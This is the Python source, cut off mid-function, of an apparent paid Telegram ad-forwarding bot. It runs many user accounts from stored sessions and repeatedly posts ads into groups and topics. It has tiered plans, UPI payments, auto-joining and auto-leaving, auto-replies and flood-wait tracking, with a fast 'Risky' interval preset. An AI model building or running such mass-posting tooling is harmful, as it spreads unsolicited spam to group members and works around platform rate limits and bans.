import os
import asyncio
import sys
import psutil
import random
import string
import re
from datetime import datetime, timedelta
from telethon import TelegramClient, Button, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    ChannelPrivateError,
    ChatWriteForbiddenError,
    UserBannedInChannelError,
    MessageNotModifiedError,
    UserNotParticipantError
)
from telethon.tl.functions.channels import GetParticipantRequest, LeaveChannelRequest
from telethon.tl.functions.messages import ForwardMessagesRequest, DeleteChatUserRequest
from telethon.tl.types import Channel, Chat, User, InputPeerChannel, InputPeerChat
from cryptography.fernet import Fernet
from pymongo import MongoClient
import time
import requests
import qrcode
import random

from config import BOT_CONFIG, FREE_TIER, PREMIUM_TIER, MESSAGES, TOPICS, INTERVAL_PRESETS, FORCE_JOIN, PLANS, PLAN_SCOUT, PLAN_IMAGES, UPI_PAYMENT

# Proxies removed - using direct connection
PROXIES = []
import python_socks

CONFIG = BOT_CONFIG

# Helper function to get username from user ID
async def get_username_from_id(client, user_id: int):
    """Fetch username from Telegram using user ID"""
    try:
        user = await client.get_entity(user_id)
        return user.username  # None if no username
    except Exception:
        return None

def check_config():
    required = ['api_id', 'api_hash', 'bot_token', 'owner_id', 'mongo_uri']
    missing = []
    for key in required:
        val = CONFIG.get(key)
        if not val or val == '' or val == 0:
            missing.append(key.upper())
    return missing

missing_config = check_config()
if missing_config:
    print("\n" + "="*50)
    print("CONFIGURATION ERROR")
    print("="*50)
    print(f"Missing required secrets: {', '.join(missing_config)}")
    print("\nPlease add these secrets in the Secrets tab:")
    print("- TELEGRAM_API_ID")
    print("- TELEGRAM_API_HASH")
    print("- BOT_TOKEN")
    print("- OWNER_ID")
    print("- MONGO_URI")
    print("="*50)
    exit(1)

if not os.path.exists('encryption.key'):
    key = Fernet.generate_key().decode()
    with open('encryption.key', 'w') as f:
        f.write(key)
else:
    with open('encryption.key', 'r') as f:
        key = f.read().strip()
cipher_suite = Fernet(key.encode())

mongo_client = MongoClient(CONFIG['mongo_uri'])
db = mongo_client[CONFIG['db_name']]

users_col = db['users']
accounts_col = db['accounts']
account_topics_col = db['account_topics']
account_settings_col = db['account_settings']
account_stats_col = db['account_stats']
account_auto_groups_col = db['account_auto_groups']
account_failed_groups_col = db['account_failed_groups']
account_flood_waits_col = db['account_flood_waits']
logger_tokens_col = db['logger_tokens']
admins_col = db['admins']

# --- Session directory setup ---
# Always store Telethon sqlite session files inside ./session/
SESSION_DIR = 'session'
os.makedirs(SESSION_DIR, exist_ok=True)

# Migrate any legacy session files from project root into ./session/
# (e.g. main_bot.session, logger_bot.session, and their -journal files)
for _name in ('main_bot', 'logger_bot'):
    for _suffix in ('.session', '.session-journal'):
        _src = f"{_name}{_suffix}"
        _dst = os.path.join(SESSION_DIR, _src)
        try:
            if os.path.exists(_src) and not os.path.exists(_dst):
                os.replace(_src, _dst)
        except Exception:
            # Non-fatal; bot can still run
            pass

# Point Telethon at the session base path (Telethon adds .session)
main_bot = TelegramClient(os.path.join(SESSION_DIR, 'main_bot'), CONFIG['api_id'], CONFIG['api_hash'])
logger_bot = TelegramClient(os.path.join(SESSION_DIR, 'logger_bot'), CONFIG['api_id'], CONFIG['api_hash'])
notification_bot = TelegramClient(os.path.join(SESSION_DIR, 'notification_bot'), CONFIG['api_id'], CONFIG['api_hash'])

# ===================== Global Text Styling =====================
# Telegram doesn't allow changing the app UI font, but we can stylize outgoing
# text using Unicode "small caps-ish" letters and make HTML messages bold.
# This is applied to all outgoing captions/messages and inline button labels.

# Small-caps-ish mapping (not all letters exist in Unicode; fallback keeps original)
_SMALLCAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ',
    'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
    'q': 'ꞯ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
    'y': 'ʏ', 'z': 'ᴢ',
}
_SMALLCAPS_REVERSE_MAP = {v: k for k, v in _SMALLCAPS_MAP.items()}


def _to_smallcaps_char(ch: str) -> str:
    # Only stylize latin letters; keep everything else (emojis, punctuation, RTL, etc.)
    lower = ch.lower()
    if lower in _SMALLCAPS_MAP and ch.isalpha():
        return _SMALLCAPS_MAP[lower]
    return ch


def _from_smallcaps_char(ch: str) -> str:
    """Reverse mapping so HTML tag names aren't corrupted if already stylized."""
    if ch in _SMALLCAPS_REVERSE_MAP:
        return _SMALLCAPS_REVERSE_MAP[ch]
    return ch


def _normalize_html_tag(tag_text: str) -> str:
    """Normalize a single <...> tag by converting any small-caps letters back to ASCII."""
    return ''.join(_from_smallcaps_char(c) for c in tag_text)


def _stylize_plain(text: str) -> str:
    if not text:
        return text
    return ''.join(_to_smallcaps_char(c) for c in str(text))


def _stylize_html(html: str) -> str:
    """Stylize text while preserving HTML tags/entities and leaving <code>/<pre> blocks untouched.

    - Converts plain text to small-caps-ish Unicode
    - Normalizes tag names if they were previously stylized
    - Wraps the final output in <b>...</b> to give a consistent bold look
    """
    if not html:
        return html

    s = str(html)
    out = []

    in_entity = False
    in_code = False

    i = 0
    while i < len(s):
        ch = s[i]

        # Capture full HTML tag and normalize it
        if ch == '<':
            j = s.find('>', i + 1)
            if j == -1:
                out.append(_to_smallcaps_char(ch) if not in_code else ch)
                i += 1
                continue

            tag = s[i:j + 1]
            norm_tag = _normalize_html_tag(tag)

            lower = norm_tag.lower()
            if lower.startswith('<code') or lower.startswith('<pre'):
                in_code = True
            elif lower.startswith('</code') or lower.startswith('</pre'):
                in_code = False

            out.append(norm_tag)
            i = j + 1
            continue

        # Track HTML entities (&amp; etc.) so we don't corrupt them
        if ch == '&':
            in_entity = True
            out.append(ch)
            i += 1
            continue

        if in_entity:
            out.append(ch)
            if ch == ';':
                in_entity = False
            i += 1
            continue

        out.append(_to_smallcaps_char(ch) if not in_code else ch)
        i += 1

    styled = ''.join(out)

    # Make everything bold consistently (Telegram HTML). Safe even if nested.
    return f"<b>{styled}</b>"


def _stylize_buttons(buttons):
    """Recursively rebuild Telethon Button structures with stylized labels."""
    if not buttons:
        return buttons

    def rebuild(btn):
        # Telethon buttons are lightweight objects created by telethon.Button
        try:
            txt = getattr(btn, 'text', None)
            data = getattr(btn, 'data', None)
            url = getattr(btn, 'url', None)

            if url is not None:
                return Button.url(_stylize_plain(txt), url)
            if data is not None:
                return Button.inline(_stylize_plain(txt), data)
        except Exception:
            return btn
        return btn

    try:
        # buttons can be a list[list[Button]] or list[Button]
        if isinstance(buttons, list):
            rebuilt = []
            for row in buttons:
                if isinstance(row, list):
                    rebuilt.append([rebuild(b) for b in row])
                else:
                    rebuilt.append(rebuild(row))
            return rebuilt
    except Exception:
        return buttons

    return buttons


def _patch_client_text_methods(client: TelegramClient):
    """Patch send_message/send_file/edit_message to stylize outgoing text/captions + button labels."""
    orig_send_message = client.send_message
    orig_send_file = client.send_file
    orig_edit_message = client.edit_message

    async def send_message_wrapped(*args, **kwargs):
        # Telethon signature: send_message(entity, message=None, ...)
        # Check for _no_style flag to bypass font transformation
        no_style = kwargs.pop('_no_style', False)
        
        if not no_style:
            if len(args) >= 2 and isinstance(args[1], str) and 'message' not in kwargs:
                parse_mode = kwargs.get('parse_mode')
                args = list(args)
                args[1] = _stylize_html(args[1]) if str(parse_mode).lower() == 'html' else _stylize_plain(args[1])
            elif isinstance(kwargs.get('message'), str):
                parse_mode = kwargs.get('parse_mode')
                kwargs['message'] = _stylize_html(kwargs['message']) if str(parse_mode).lower() == 'html' else _stylize_plain(kwargs['message'])

            if 'buttons' in kwargs:
                kwargs['buttons'] = _stylize_buttons(kwargs['buttons'])

        return await orig_send_message(*args, **kwargs)

    async def send_file_wrapped(*args, **kwargs):
        # send_file(entity, file, caption=..., ...)
        if isinstance(kwargs.get('caption'), str):
            parse_mode = kwargs.get('parse_mode')
            kwargs['caption'] = _stylize_html(kwargs['caption']) if str(parse_mode).lower() == 'html' else _stylize_plain(kwargs['caption'])

        if 'buttons' in kwargs:
            kwargs['buttons'] = _stylize_buttons(kwargs['buttons'])

        return await orig_send_file(*args, **kwargs)

    async def edit_message_wrapped(*args, **kwargs):
        # edit_message(entity, message, text=..., ...)
        parse_mode = kwargs.get('parse_mode')

        # Handle positional text argument (common when calling client.edit_message(entity, msg_id, text, ...))
        if len(args) >= 3 and isinstance(args[2], str) and 'text' not in kwargs:
            args = list(args)
            args[2] = _stylize_html(args[2]) if str(parse_mode).lower() == 'html' else _stylize_plain(args[2])

        # Handle keyword text
        if isinstance(kwargs.get('text'), str):
            kwargs['text'] = _stylize_html(kwargs['text']) if str(parse_mode).lower() == 'html' else _stylize_plain(kwargs['text'])

        if 'buttons' in kwargs:
            kwargs['buttons'] = _stylize_buttons(kwargs['buttons'])

        return await orig_edit_message(*args, **kwargs)

    client.send_message = send_message_wrapped
    client.send_file = send_file_wrapped
    client.edit_message = edit_message_wrapped


# Apply patch to both bots
_patch_client_text_methods(main_bot)
_patch_client_text_methods(logger_bot)

user_states = {}
forwarding_tasks = {}
auto_reply_clients = {}
last_replied = {}

# Auto group-join cancellation flags (uid -> bool)
auto_join_cancel = {}

# Per-user forwarding loop (so all accounts send in parallel, then round delay once)
user_forwarding_tasks = {}  # user_id -> asyncio.Task

# Payment tracking (gateway.py integration)
# (Removed) gateway payment tracking (manual UPI now)

ACCOUNTS_PER_PAGE = 7

# (Removed) External payment gateway integration
# ===================== Manual UPI Payment Helpers =====================

# In-memory pending payments
# pending_upi_payments[request_id] = {
#   'user_id': int, 'username': str|None, 'plan_key': str, 'plan_name': str,
#   'price': int, 'created_at': datetime, 'status': 'awaiting_screenshot'|'submitted'
# }
pending_upi_payments = {}

# Map admin message -> request_id so approve/reject can find it
admin_payment_message_map = {}


def _new_payment_request_id(uid: int, plan_key: str) -> str:
    # short unique id for callbacks
    return f"p{uid}_{plan_key}_{int(datetime.now().timestamp())}{random.randint(100,999)}"


def _upi_payment_caption(plan: dict, plan_key: str) -> str:
    upi_id = UPI_PAYMENT.get('upi_id', '')
    payee = UPI_PAYMENT.get('payee_name', '')
    return (
        f"<b>🧾 Manual UPI Payment</b>\n\n"
        f"<b>Plan:</b> {plan.get('name', plan_key).title()}\n"
        f"<b>Price:</b> {plan.get('price_display', plan.get('price', ''))}\n\n"
        f"<b>UPI ID:</b> <code>{_h(upi_id)}</code>\n"
        f"<b>Name:</b> {_h(payee)}\n\n"
        f"<blockquote>Scan the QR and pay. Then tap <b>Payment Done</b> and send payment screenshot.</blockquote>"
    )
# ===================== Force Join (Config-based: Channel + Group) =====================

def _forcejoin_usernames():
    # Channel-only force join
    ch = (FORCE_JOIN.get('channel_username') or '').strip().lstrip('@')
    return ch, ''

async def _is_member_of(username: str, user_id: int) -> bool:
    if not username:
        return True
    try:
        entity = await main_bot.get_entity(username)
        await main_bot(GetParticipantRequest(entity, user_id))
        return True
    except (UserNotParticipantError, ChannelPrivateError, ValueError):
        return False
    except Exception:
        # Fail-open to avoid locking everyone out if Telegram errors
        return True

async def is_user_passed_forcejoin(user_id: int) -> bool:
    if is_admin(user_id):
        return True
    if not FORCE_JOIN.get('enabled', False):
        return True

    channel_username, group_username = _forcejoin_usernames()
    # If misconfigured (missing usernames), don't block
    if not channel_username and not group_username:
        return True

    ok_channel = await _is_member_of(channel_username, user_id)
    return ok_channel

def forcejoin_keyboard():
    channel_username, _ = _forcejoin_usernames()
    buttons = []
    if channel_username:
        buttons.append([Button.url("Join Channel", f"https://t.me/{channel_username}")])
    buttons.append([Button.inline("Verify", b"force_verify")])
    return buttons

async def send_forcejoin_prompt(event, edit=False):
    msg = FORCE_JOIN.get('message') or "**Access Locked**\n\nPlease join required chats and verify."
    img = (FORCE_JOIN.get('image_url') or '').strip()

    if edit:
        # can't edit media easily; edit text only
        await event.edit(msg, buttons=forcejoin_keyboard())
        return

    if img:
        await event.respond(file=img, message=msg, buttons=forcejoin_keyboard())
    else:
        await event.respond(msg, buttons=forcejoin_keyboard())

async def enforce_forcejoin_or_prompt(event, edit=False) -> bool:
    uid = event.sender_id
    if await is_user_passed_forcejoin(uid):
        return True
    await send_forcejoin_prompt(event, edit=edit)
    return False

def is_admin(user_id):
    # Owner is always admin
    try:
        if int(user_id) == int(CONFIG['owner_id']):
            return True
        # Check if user is in admins collection
        is_db_admin = admins_col.find_one({'user_id': int(user_id)}) is not None
        return is_db_admin
    except Exception as e:
        print(f"[ERROR] is_admin check failed for {user_id}: {e}")
        return False

def get_user(user_id):
    user = users_col.find_one({'user_id': int(user_id)})
    if not user:
        user = {
            'user_id': int(user_id),
            'tier': 'free',
            'max_accounts': FREE_TIER['max_accounts'],
            'approved': False,
            'autoreply_enabled': False,  # Default OFF
            'interval_preset': 'fast',  # Default: Risky (10s/120s)
            'forwarding_mode': 'auto',  # Default: Auto Groups Only
            'ads_mode': 'saved',
            'smart_rotation': False,
            'auto_sleep_enabled': False,  # Default OFF for auto sleep
            'auto_sleep_duration': 1800,  # Default 30 minutes (in seconds)
            'created_at': datetime.now(),
            '_is_new_user': True  # Flag for notification
        }
        users_col.insert_one(user)
    return user

def is_premium(user_id):
    """Premium check with expiry enforcement (auto-downgrade when expired)."""
    if is_admin(user_id):
        return True

    user = get_user(user_id)
    if user.get('tier') != 'premium':
        return False

    expires_at = user.get('premium_expires_at') or user.get('premium_expiry') or user.get('plan_expiry')
    if expires_at:
        try:
            # If stored datetime is naive, treat as local and compare with now()
            if expires_at < datetime.now():
                remove_user_premium(user_id)
                return False
        except Exception:
            # If comparison fails, fail-open (keep premium) to avoid breaking users
            return True

    return True

def has_per_account_config_access(user_id):
    """Check if user can access per-account config (Prime/Dominion only)."""
    if is_admin(user_id):
        return True
    user = get_user(user_id)
    # Check if user has enough accounts granted (Prime=7+, Dominion=15+)
    max_accs = user.get('max_accounts', 1)
    return max_accs >= 7  # Prime tier or higher

def get_user_tier_settings(user_id):
    if is_premium(user_id):
        return PREMIUM_TIER.copy()
    return FREE_TIER.copy()

def get_user_max_accounts(user_id):
    if is_admin(user_id):
        return 999  # Admins get unlimited accounts
    user = get_user(user_id)
    if user.get('tier') == 'premium':
        return user.get('max_accounts', PREMIUM_TIER['max_accounts'])
    return FREE_TIER['max_accounts']

def is_approved(user_id):
    if is_admin(user_id):
        return True
    user = get_user(user_id)
    return user.get('approved', False)

def approve_user(user_id):
    users_col.update_one(
        {'user_id': int(user_id)},
        {'$set': {'approved': True, 'approved_at': datetime.now()}},
        upsert=True
    )

def set_user_premium(user_id, max_accounts, plan_name='premium'):
    """Grant premium with 30-day expiry (monthly subscription)."""
    expires_at = datetime.now() + timedelta(days=30)
    
    # Determine plan key (grow, prime, dominion) from plan_name
    plan_key = plan_name.lower() if plan_name.lower() in ['grow', 'prime', 'dominion'] else 'grow'
    
    users_col.update_one(
        {'user_id': int(user_id)},
        {'$set': {
            'tier': 'premium',
            'plan': plan_key,  # Store plan key (grow/prime/dominion) for profile display
            'max_accounts': max_accounts,
            'plan_name': plan_name,  # Store actual plan name (Grow/Prime/Dominion)
            'premium_granted_at': datetime.now(),
            'premium_expires_at': expires_at,
            'plan_expiry': expires_at,  # Add this for profile display
            'approved': True
        }},
        upsert=True
    )

def remove_user_premium(user_id):
    """Downgrade user to free and clear premium-related fields."""
    users_col.update_one(
        {'user_id': int(user_id)},
        {'$set': {
            'tier': 'free',
            'plan': 'scout',
            'plan_name': 'Scout',
            'max_accounts': FREE_TIER['max_accounts'],
            'premium_expires_at': None,
            'premium_expiry': None,
            'plan_expiry': None,
        }}
    )

def get_all_users():
    return list(users_col.find({}))

def get_premium_users():
    return list(users_col.find({'tier': 'premium'}))

def get_user_accounts(user_id):
    return list(accounts_col.find({'owner_id': user_id}).sort('added_at', 1))

def get_account_by_id(account_id):
    from bson.objectid import ObjectId
    try:
        return accounts_col.find_one({'_id': ObjectId(account_id)})
    except:
        return None

def get_account_by_index(user_id, index):
    accounts = get_user_accounts(user_id)
    if 0 < index <= len(accounts):
        return accounts[index - 1]
    return None

def get_account_settings(account_id):
    settings = account_settings_col.find_one({'account_id': account_id})
    if not settings:
        settings = {
            'account_id': account_id,
            # group_delay deprecated (no longer used)
            'msg_delay': FREE_TIER['msg_delay'],
            'round_delay': FREE_TIER['round_delay'],
            'logs_chat_id': None,
        }
        account_settings_col.insert_one(settings)
    return settings

def update_account_settings(account_id, updates):
    account_settings_col.update_one(
        {'account_id': account_id},
        {'$set': updates},
        upsert=True
    )

def get_account_stats(account_id):
    stats = account_stats_col.find_one({'account_id': account_id})
    if not stats:
        stats = {'account_id': account_id, 'total_sent': 0, 'total_failed': 0, 'last_forward': None}
        account_stats_col.insert_one(stats)
    return stats

def update_account_stats(account_id, sent=0, failed=0):
    account_stats_col.update_one(
        {'account_id': account_id},
        {'$inc': {'total_sent': sent, 'total_failed': failed}, '$set': {'last_forward': datetime.now()}},
        upsert=True
    )

def is_group_failed(account_id, group_key):
    failed = account_failed_groups_col.find_one({'account_id': account_id, 'group_key': group_key})
    return failed is not None

def mark_group_failed(account_id, group_key, error):
    account_failed_groups_col.update_one(
        {'account_id': account_id, 'group_key': group_key},
        {'$set': {'error': str(error)[:200], 'failed_at': datetime.now()}},
        upsert=True
    )

def clear_failed_groups(account_id):
    account_failed_groups_col.delete_many({'account_id': account_id})

def get_flood_wait(account_id, group_key):
    doc = account_flood_waits_col.find_one({'account_id': account_id, 'group_key': group_key})
    if doc:
        wait_until = doc.get('wait_until')
        if wait_until and wait_until > datetime.now():
            remaining = (wait_until - datetime.now()).total_seconds()
            return int(remaining)
        else:
            account_flood_waits_col.delete_one({'account_id': account_id, 'group_key': group_key})
    return 0

def set_flood_wait(account_id, group_key, group_name, seconds):
    wait_until = datetime.now() + timedelta(seconds=seconds)
    account_flood_waits_col.update_one(
        {'account_id': account_id, 'group_key': group_key},
        {'$set': {
            'group_name': group_name,
            'wait_seconds': seconds,
            'wait_until': wait_until,
            'created_at': datetime.now()
        }},
        upsert=True
    )

def clear_flood_waits(account_id):
    account_flood_waits_col.delete_many({'account_id': account_id})

def get_active_flood_waits(account_id):
    now = datetime.now()
    return account_flood_waits_col.count_documents({
        'account_id': account_id,
        'wait_until': {'$gt': now}
    })

def generate_token(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

proxy_index = 0

def get_next_proxy():
    global proxy_index
    if not PROXIES:
        return None
    proxy = PROXIES[proxy_index % len(PROXIES)]
    proxy_index += 1
    
    proxy_type = python_socks.ProxyType.SOCKS5
    if proxy['type'].lower() == 'socks4':
        proxy_type = python_socks.ProxyType.SOCKS4
    elif proxy['type'].lower() == 'http':
        proxy_type = python_socks.ProxyType.HTTP
    
    return (proxy_type, proxy['host'], proxy['port'], True, proxy.get('username'), proxy.get('password'))

def parse_link(link):
    topic_id = None
    match = re.search(r'/(\d+)$', link)
    if match:
        topic_id = int(match.group(1))
    base = re.sub(r'/\d+$', '', link).rstrip('/')
    if '/c/' in base:
        cid = base.split('/c/')[-1]
        peer = int('-100' + cid)
        url = f"https://t.me/c/{cid}"
    else:
        username = base.split('t.me/')[-1]
        peer = username
        url = f"https://t.me/{username}"
    return peer, url, topic_id


def _account_id_variants(account_id):
    """Return possible stored variants for account_id field (ObjectId vs str)."""
    return [account_id, str(account_id)]

async def safe_leave_chat(client, target):
    """Best-effort leave for channels/supergroups and basic groups.

    `target` can be an entity, username, chat id, or input peer.
    """
    if target is None:
        return False

    try:
        entity = target
        # Resolve to an entity if needed
        if isinstance(target, (str, int)):
            entity = await client.get_entity(target)

        # Channels / supergroups
        if isinstance(entity, Channel) or isinstance(entity, InputPeerChannel):
            peer = await client.get_input_entity(entity)
            await client(LeaveChannelRequest(peer))
            return True

        # Basic groups
        if isinstance(entity, Chat) or isinstance(entity, InputPeerChat):
            chat_id = entity.id if hasattr(entity, 'id') else getattr(entity, 'chat_id', None)
            await client(DeleteChatUserRequest(chat_id=chat_id, user_id='me'))
            return True

        # Fallback: try leave as channel
        peer = await client.get_input_entity(entity)
        await client(LeaveChannelRequest(peer))
        return True

    except Exception:
        return False


def _is_auto_leave_enabled(user_id: int) -> bool:
    """User-level toggle for whether bot should auto-leave groups on permanent send failures."""
    try:
        doc = get_user(int(user_id))
        return bool(doc.get('auto_leave_groups', True))
    except Exception:
        return True


def remove_group_from_db(account_id, target_type, group_key, data=None):
    """Remove a group/topic target permanently from DB for this account."""
    try:
        # Clear failure/flood tracking too
        account_failed_groups_col.delete_one({'account_id': account_id, 'group_key': group_key})
        account_flood_waits_col.delete_one({'account_id': account_id, 'group_key': group_key})

        if target_type == 'topic':
            data = data or {}
            link = data.get('url') or data.get('link') or group_key
            # Backwards compatibility: some docs might store as url
            account_topics_col.delete_many({'account_id': {'$in': _account_id_variants(account_id)}, '$or': [{'link': link}, {'url': link}]})
            return True

        if target_type == 'auto':
            data = data or {}
            gid = data.get('group_id')
            if gid is None:
                try:
                    gid = int(str(group_key))
                except Exception:
                    gid = None
            q = {'account_id': account_id}
            if gid is not None:
                q['group_id'] = gid
            else:
                q['group_id'] = {'$exists': True}
            account_auto_groups_col.delete_many(q)
            return True

        return False
    except Exception:
        return False


async def notify_auto_left(account_id, phone, group_name, group_key, reason=None):
    """Send logger notification when a group is auto-left."""
    try:
        reason_txt = f"\nReason: {reason}" if reason else ""
        msg = (
            "🚪 <b>Auto Left Group</b>\n"
            f"Phone: <code>{_h(phone or 'Unknown')}</code>\n"
            f"Group: <code>{_h(group_name or 'Unknown')}</code>\n"
            f"Key: <code>{_h(str(group_key))}</code>"
            f"{reason_txt}"
        )
        await send_log(account_id, msg)
    except Exception:
        pass


async def _get_user_logs_chat_id_for_account(account_id):
    """Logs are configured once per USER and apply to all their accounts."""
    try:
        acc = accounts_col.find_one({'_id': account_id}, {'owner_id': 1})
        if not acc:
            return None
        owner_id = acc.get('owner_id')
        if not owner_id:
            return None
        user_doc = users_col.find_one({'user_id': int(owner_id)}, {'logs_chat_id': 1})
        if not user_doc:
            return None
        return user_doc.get('logs_chat_id')
    except Exception:
        return None


async def send_log(account_id, message, view_link=None, group_name=None):
    """Send logs via logger bot (user-level)."""
    try:
        chat_id = await _get_user_logs_chat_id_for_account(account_id)
        if not chat_id:
            return

        if not CONFIG.get('logger_bot_token'):
            return

        if view_link and group_name:
            buttons = [[Button.url("View Message", view_link)]]
            full_msg = f"<b>Sent to {_h(group_name)}</b>"
            await logger_bot.send_message(int(chat_id), full_msg, buttons=buttons, parse_mode='html')
        elif message:
            msg_text = str(message) if not isinstance(message, str) else message
            await logger_bot.send_message(int(chat_id), msg_text, parse_mode='html')
    except Exception as e:
        print(f"[LOG ERROR] {e}")

async def add_user_log(user_id, log_msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] {log_msg}"
    users_col.update_one(
        {'user_id': user_id},
        {'$push': {'recent_logs': {'$each': [log_entry], '$slice': -100}}}
    )

async def run_forwarding_loop(user_id, account_id):
    print(f"[FORWARDING] Starting loop for account {account_id}")
    client = None
    
    try:
        acc = accounts_col.find_one({'_id': account_id})
        if not acc:
            print(f"[FORWARDING] Account {account_id} not found")
            return
        
        session = cipher_suite.decrypt(acc['session'].encode()).decode()
        client = TelegramClient(StringSession(session), CONFIG['api_id'], CONFIG['api_hash'])
        await client.connect()
        
        if not await client.is_user_authorized():
            print(f"[FORWARDING] Account {account_id} not authorized")
            return
        
        print(f"[FORWARDING] Client connected for account {account_id}")
        
        # Attach auto-reply handler to the SAME client (best practice)
        owner_id = acc.get('owner_id')
        user = get_user(owner_id)
        if user.get('autoreply_enabled', False):
            # Only use custom message - no default fallback
            settings_doc = account_settings_col.find_one({'account_id': str(account_id)})
            
            reply_text = None
            if settings_doc and 'auto_reply' in settings_doc:
                reply_text = settings_doc.get('auto_reply')
            
            if reply_text:
                @client.on(events.NewMessage(incoming=True))
                async def autoreply_handler(event):
                    # ONLY private messages
                    if not event.is_private:
                        return
                    
                    # Ignore bots
                    if isinstance(event.sender, User) and event.sender.bot:
                        return
                    
                    try:
                        await event.reply(reply_text)
                        
                        # Track auto-reply in stats
                        try:
                            account_stats_col.update_one(
                                {'account_id': str(account_id)},
                                {'$inc': {'auto_replies': 1}},
                                upsert=True
                            )
                        except Exception:
                            pass
                        
                        print(f"[AUTO-REPLY] Replied to {event.sender_id} with: {reply_text[:30]}...")
                    except Exception as e:
                        print(f"[AUTO-REPLY ERROR] {e}")
                
                print(f"[AUTO-REPLY] Attached to account {account_id} with message: {reply_text[:30]}...")
        
        round_num = 0
        while True:
            try:
                round_num += 1
                acc = accounts_col.find_one({'_id': account_id})
                if not acc or not acc.get('is_forwarding'):
                    print(f"[FORWARDING] Account {account_id} stopped")
                    break
                
                user = get_user(user_id)
                tier_settings = get_user_tier_settings(user_id)
                fwd_mode = user.get('forwarding_mode', 'topics')
                
                # group_delay removed: use msg_delay between each send and a round_delay after full cycle
                msg_delay = tier_settings.get('msg_delay', 45)
                round_delay = tier_settings.get('round_delay', 7200)
                
                # ===================== Ads Source (Ads Mode) =====================
                ads_mode = user.get('ads_mode', 'saved')

                ads = []
                custom_text = None
                post_source_entity = None
                post_source_msg_id = None
                post_source_input_peer = None

                if ads_mode == 'custom':
                    custom_text = (user.get('ads_custom_message') or '').strip()
                    if not custom_text:
                        print(f"[FORWARDING] Custom message not set for {account_id}")
                        await add_user_log(user_id, "Custom message not set - Settings → Ads Mode → Set Custom Message")
                        await asyncio.sleep(60)
                        continue
                    ads = [None]
                    print(f"[FORWARDING] Using Custom Message mode")

                elif ads_mode == 'post':
                    link = (user.get('ads_post_link') or '').strip()
                    if not link:
                        print(f"[FORWARDING] Post link not set for {account_id}")
                        await add_user_log(user_id, "Post link not set - Settings → Ads Mode → Set Post Link")
                        await asyncio.sleep(60)
                        continue

                    try:
                        tail = link.replace('https://t.me/', '')
                        parts = [p for p in tail.split('/') if p]
                        if parts and parts[0] == 'c' and len(parts) >= 3:
                            cid = parts[1]
                            post_source_entity = int('-100' + str(cid))
                            post_source_msg_id = int(parts[2])
                        else:
                            post_source_entity = parts[0]
                            post_source_msg_id = int(parts[-1])

                        _m = await client.get_messages(post_source_entity, ids=post_source_msg_id)
                        if not _m:
                            raise Exception('Message not found / no access')
                        post_source_input_peer = await client.get_input_entity(post_source_entity)
                        ads = [None]
                        print(f"[FORWARDING] Using Post Link mode")
                    except Exception as e:
                        print(f"[FORWARDING] Invalid post link: {e}")
                        await add_user_log(user_id, f"Invalid post link or no access: {str(e)[:120]}")
                        await asyncio.sleep(60)
                        continue

                else:
                    async for msg in client.iter_messages('me', limit=10):
                        if msg.text or msg.media:
                            ads.append(msg)
                    ads.reverse()

                    if not ads:
                        print(f"[FORWARDING] No ads in Saved Messages for {account_id}")
                        await add_user_log(user_id, "No ads in Saved Messages - add messages to Saved Messages")
                        await asyncio.sleep(60)
                        continue

                    print(f"[FORWARDING] Loaded {len(ads)} ads from Saved Messages")
                
                # Round start log so user can confirm next round started
                try:
                    # Get user settings for display
                    user_doc = get_user(user_id)
                    
                    # Fix mode display to show user-friendly text
                    if fwd_mode == 'topics':
                        mode_display = "Topics Only"
                    elif fwd_mode == 'auto':
                        mode_display = "Groups Only"
                    elif fwd_mode == 'both':
                        mode_display = "Topics & Groups"
                    else:
                        mode_display = fwd_mode.capitalize()
                    
                    # Get auto leave and auto reply status
                    auto_leave = "✅ ON" if user_doc.get('auto_leave_groups', True) else "❌ OFF"
                    auto_reply = "✅ ON" if user_doc.get('auto_reply_enabled', False) else "❌ OFF"
                    
                    log_msg = (
                        f"<b>🔄 Starting Round</b>\n\n"
                        f"<b>Mode:</b> <code>{mode_display}</code>\n"
                        f"<b>Ads Mode:</b> <code>{ads_mode.upper()}</code>\n"
                        f"<b>Auto Leave:</b> {auto_leave}\n"
                        f"<b>Auto Reply:</b> {auto_reply}"
                    )
                    await send_log(account_id, log_msg)
                except Exception:
                    pass

                groups_to_forward = []
                
                acc_id_str = str(account_id)
                
                if fwd_mode in ('topics', 'both'):
                    topic_groups = list(account_topics_col.find({'account_id': acc_id_str}))
                    if not topic_groups:
                        topic_groups = list(account_topics_col.find({'account_id': {'$in': _account_id_variants(account_id)}}))
                    
                    for tg in topic_groups:
                        link = tg.get('link') or tg.get('url')
                        if link and 't.me/' in link:
                            if '?' in link:
                                link = link.split('?')[0]
                            peer, url, topic_id = parse_link(link)
                            group_key = link
                            if not is_group_failed(acc_id_str, group_key):
                                groups_to_forward.append({
                                    'peer': peer,
                                    'url': url,
                                    'topic_id': topic_id,
                                    'title': tg.get('title', link.split('/')[-2] if '/' in link else 'Unknown'),
                                    'type': 'topic',
                                    'key': group_key
                                })
                    print(f"[FORWARDING] Added {len(groups_to_forward)} topic groups")
                
                if fwd_mode in ('auto', 'both'):
                    auto_groups = list(account_auto_groups_col.find({'account_id': {'$in': _account_id_variants(account_id)}}))
                    if not auto_groups:
                        auto_groups = []
                    
                    count = 0
                    for ag in auto_groups:
                        group_key = str(ag['group_id'])
                        if not is_group_failed(acc_id_str, group_key):
                            groups_to_forward.append({
                                'group_id': ag['group_id'],
                                'access_hash': ag.get('access_hash'),
                                'username': ag.get('username'),
                                'title': ag.get('title', 'Unknown'),
                                'type': 'auto',
                                'key': group_key
                            })
                            count += 1
                    print(f"[FORWARDING] Added {count} auto groups")
                
                if not groups_to_forward:
                    print(f"[FORWARDING] No groups to forward to")
